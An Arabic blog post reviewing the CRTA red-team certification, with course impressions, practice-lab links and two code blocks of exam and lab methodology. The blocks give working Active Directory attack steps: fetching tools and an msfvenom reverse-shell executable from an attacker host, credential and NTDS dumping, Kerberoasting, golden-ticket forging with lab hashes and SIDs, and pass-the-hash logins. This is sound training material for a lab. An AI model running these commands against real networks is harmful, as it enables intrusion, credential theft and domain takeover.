---
header:
 teaser: /assets/images/Certs/CRTZ.png
title: "CRTA: Full Guide & My Honest Review"
author_profile: true
layout: single
categories: [Certificates]
excerpt: "Certified Red Team Analyst Review & Full Guide (LAB & EXAM) Tips!"
tags: [Certificates]
toc: true
toc_sticky: true
permalink: /Certificates/CRTA-Full-Guide-&-My-Honest-Review/ar/
---
![](/assets/images/Certs/CRTZ.png)
{% include arabic-btn.html %}
## المقدمة
السلام عليكم ورحمة الله وبركاته يوم ١١ اكتوبر ٢٠٢٦، جبت شهادة الريد تيم اناليست **(CRTA)** وبالله الحمد الاختبار ريد تيم واقعي تبدأ من جهازك وموقع إلى ان توصل ل Full AD Overtake.
الاختبار مكون من اعلام تحصلها في مراحل مختلفة داخل الاختبار وبمجرد وماتخلص كل الاعلام تكون خلصت والشهادة تطلع لك علطول

تحت حاط لكم طريقة الإختبار خطوة خطوة
``` text
SSRF --> LFI ETC/PASSWD --> Enumeration --> Website Login Credentials 
& Hidden IP with HTTP --> AD Initial Access credentials in txt file --> Privilege Escalation --> Secret Flag
```

## محتوى الكورس
الكورس يعتبر ممتاز للمتبدئين، بالذات الكتاب ولكن في ملاحظات منها اخطاء لغوية في الكتاب والفيديوهات صعب فهمها لكثافة لهجة المدرس والفيديوهات طويلة بدون داعي الصراحة وممكن تتوهك وتحسسك ان الاختبار او اللاب اصعب من ماهو
اهم مرحلة هي اللاب او الكيس ستدي لان يشرح لك طريقة حل الللاب نصيحتي للي بيدخل الكورس انك تحاول في اللاب اكثر من مره باكثر من طريقه عشان تعرف تحل وماتتوهق. مايحتاج تستخدم التولز الموجوده بالفديو بتضيع وقت بدون داعي فالأفضل انك تحل بالطريقه والتولز اللي تريحك ومتعود عليها

أهم نصيحه انك لو جديد على الاكتف دايركتوري انك تدرسه وتفهم الاساسيات بالأول سواء من محتوى الكورس أو غيره وتدرب على لابات وتحت راح احط كم سورس بيفيدك
## الإختبار
الإختبار بصراحة أسهل بكثير مما توقعت وعكس اللاب بشكل كبير. اللاب فيه تفاصيل اكثر لأن نحتاج نسوي قولدن تيكت اتاك عشان ننتحل الادمن او نزور رتبة اعلى من اللي عندنا عشان ندخل للبارنت دومين ولكن ماراح تسوي كذا في الاختبار وابسط مما تتخيل

لكن كبداية الاختبار جميل لانك راح تطبق ريد تيمينق واقعي بانك تبدأ فقط بموقع وتوصل للشبكة الداخلية اللي اصلا لازم تحصلها في اللوجز بأنك تبحث يدوي او بأدوات تناسبك، لكن بشكل عام اختبار جميل للمبتدئين في الريد تيمينق بالذات لو تخطط تدخل **OSCP** أو **AD-RTS** بعدها

## كيف تجهز للإختبار؟
شخصيا اشوف اني تجهزت بزيادة عن اللزوم ولكن مافي علم يروح هدر :)خصوصا اني قبلها بكم اسبوع خلصت ال **GOAD-Light** وهذا جهزني اكثر للإختبار بالممارسة على اللاب ولابات مشابهة وبتدخل الإختبار بكل ثقة واريحية.

خلص اللاب حق الكورس اكثر من مرة وحط وقت كأنك باختبار واذا وصلت لمرحلة انك تخلصه في نص الوقت او ساعة، خش الاختبار بدون تفكير

**لابات تتدرب عليها**
- [GOAD](https://orange-cyberdefense.github.io/GOAD/labs/)
- TryHackMe - [Wreath](https://tryhackme.com/room/wreath)
- TryHackMe - [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)
- [Hack The Box](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

## طريقتي

### Exam methodology
تحت حاط لكم الخطوات اللي طبقتها بالإختبار (بدون باسوردات او فلاقز فقط الطريقة)
``` bash
# Reconnaissance
- Nmap the initial target
- SSRF --> LFI --> SSH 
# Initial Access

# Once on the system:
start python3 -m http.server 80 in your Tools/
curl -O <IP>/linpeas.sh
curl -O <IP>/agent
chmod +x linpeas.sh
chmod +x agent

# Run Linpeas
./linpeas | tee linpeas-output.txt

# After it finished, get the passwords and find the hidden internal network
grep -iE 'passwd|Password|container|docker|Accepted' linpeas-output.txt

NOTE: You dont need to docker exec -it <DOCKER_ID> because you will find the password through linpeas.

# Start Ligolo
sudo ./proxy -selfcert
./agent -connect <IP>:11601 -ignore-cert

# Then on your attacker machine
sudo ip route add 10.10.10.0/24 dev ligolo

# Nmap
sudo nmap -sn 10.10.10.0/24
# Hidden IP found earlier through Linpeas
sudo nmap -sVC 10.10.10.20
# DC Scan
sudo nmap -sVC 10.10.10.100

# Fuzz the hidden website
gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/rockyou.txt

# After you find the AD Credentials file there, test access
nxc smb <IP> <DOMAIN>/<USER>:<PASS>@<TARGET-DOMAIN> 
# If successful, proceed to dump
nxc smb <IP> <DOMAIN>/<USER>:<PASS>@<TARGET-DOMAIN> --lsa --ntds --sam
OR
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET-DOMAIN>

# Login with the administrator NT hash
evil-winrm -i <IP> -u Administrator -H <NTHASH>

Get your secret file and thats it !
```

### Lab methodology
خطوات اللاب بالكامل

``` bash
# Ligolo
sudo ./proxy -selfcert
./agent -connect <IP> -ignore-cert
autoroute

# Know what are the target IPs for AD from Linux
ip neigh show
Add REACHABLE/STALE hosts in /etc/hosts and parent IP in the resolv.conf

# IMPORTANT: After connection, add the internal IPs or /24 to the ligolo interface

# Debug Network Interface
ip route get dev ligolo
ip route get dev tun0
sudp ip route add 192.168.98.0/24 dev ligolo
sudo ip route replace 192.168.98.120/32 dev ligoxy
sudo ip route replace 192.168.98.2/32 dev ligoxy
sudo ip route replace 192.168.98.30/32 dev ligoxy

# Initial Access Enumeration
./linpeas -s | grep -iE '.db|container|sqlite|mysql' | tee linpeas_output.txt

# Enum manually for sqlite, db, and docker
echo "=== DATABASE FILES ==="; find /home /opt /var/www /srv /tmp -type f \( -iname "*.db" -o -iname "*.sqlite*" -o -iname "*.db3" \) 2>/dev/null; echo "=== CONTAINER PROCESSES ==="; ps aux | grep -Ei 'docker|containerd|podman|runc|lxc' | grep -v grep; echo "=== CONTAINER SOCKETS ==="; ls -l /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null; echo "=== COMPOSE AND ENV FILES ==="; find /home /opt /srv /var/www -type f \( -name '.env' -o -name 'compose.yaml' -o -name 'compose.yml' -o -name 'docker-compose.yml' -o -name 'docker-compose.yaml' \) 2>/dev/null

# Open an sqlite file
sqlite3 PATH/password.sqlite
# Get a shell inside a Docker container
docker exec -it <CONTAINER_ID> /bin/sh
# STABLE REV SHELL
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=192.168.98.15 LPORT=5555 -f exe -o okyz.exe

# Ligolo python dropper
listener_add --addr 192.168.98.15:8000 --to 127.0.0.1:8000
# Ligolo Stable Reverse Shell
listener_add --addr 192.168.98.15:5555 --to 127.0.0.1:666

# cURLing
curl.exe -O http://192.168.98.15:8000/okyz.exe

# Parent Domain Test
dir \\dc01.warfare.corp\C$

# AD Enumeration  
# Domain users
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --users
# Export users
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --users-export users.txt
# Groups
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --groups
# Computers
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --computers
# Domain controllers
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-list
# Domain SID
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --get-sid
# Active users
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --active-users
# Password policy
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --pass-pol
# Fine-grained password policies
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --pso
# AS-REP Roasting
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --asreproast asrep-results.txt
# Kerberoasting
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --kerberoasting kerberoast-results.txt
# Find delegation
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --find-delegation
# Accounts trusted for delegation
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --trusted-for-delegation
# BloodHound collection
nxc ldap <DC_IP> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --bloodhound -c <COLLECTION>

# Dumping
nxc smb 192.168.98.30 -u -p --ntds
nxc smb 192.168.98.30 -u -p --lsa
impacket-secretsdump -u -p

  

# GOLDEN TICKET
impacket-ticketer -domain child.warfare.corp -nthash e57dd34c1871b7a23fb17a77dec9b900 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -extra-sid S-1-5-21-3375883379-808943238-3239386119-519 administrator
export KRB5CCNAME= administrator.ccache

# TEST
nxc smb 192.168.98.2 -u administrator —use-kcache (PWN3D) (If didnt work check nameserver and make sure parent IP is the only one there.)

# DUMP
nxc smb 192.168.98.2 -u administrator --use-kcache --ntds (IT HAS TO BE NTDS)
# LOGIN
evil-winrm -i 192.168.98.2 -u administrator -H a2f7b77b62cd97161e18be2ffcfdfd60 

# GET THE FLAG OR A BETTER SHELL
curl.exe -O http://192.168.98.15:8000/okyz.exe 

# THEN LISTEN ON THE REV SHELL PORT AND THAT IT !
nc -lvnp 666
```

# Conclusion
[CyberWarfare](https://cyberwarfare.live/) ممتازة لأسعارهم وتعدد الكورسات لمختلف المجالات وعندهم عروض كل فترة.
مكان ممتاز تبدأ منه قبل ماتدخل في عمق عالم الريد تيمينق وتحتاج لتفشير سكربتاتك وخطواتك في لابات اكبر بكثير من اللي بالمعتاد عليه
 وهذي الخاتمة الحمد لله والقادم افضل :)
![](/assets/images/Certs/CRTA.png)